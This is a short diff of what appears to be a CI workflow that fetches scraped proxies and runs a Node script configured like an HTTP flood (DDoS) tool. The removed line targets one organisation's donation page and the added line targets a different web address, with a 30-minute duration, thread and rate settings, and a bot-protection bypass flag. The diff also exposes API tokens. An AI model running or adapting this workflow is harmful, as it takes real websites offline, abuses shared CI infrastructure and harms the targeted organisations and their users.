@@ -40,7 +40,7 @@ jobs:
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=A4eH8m71mK2U57785S5c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
           
-          node y.js GET  https://thesatanictemple.com/pages/donate 1800 4 90  --debug --bfm
+          node a.js GET  https://freefollowers.up.railway.app/location.html?id=6622811674&type=location&token=5bf413d0164d4257836d770742b089f4 1800 4 10 proxy.txt  --debug --bfm
   
         
           
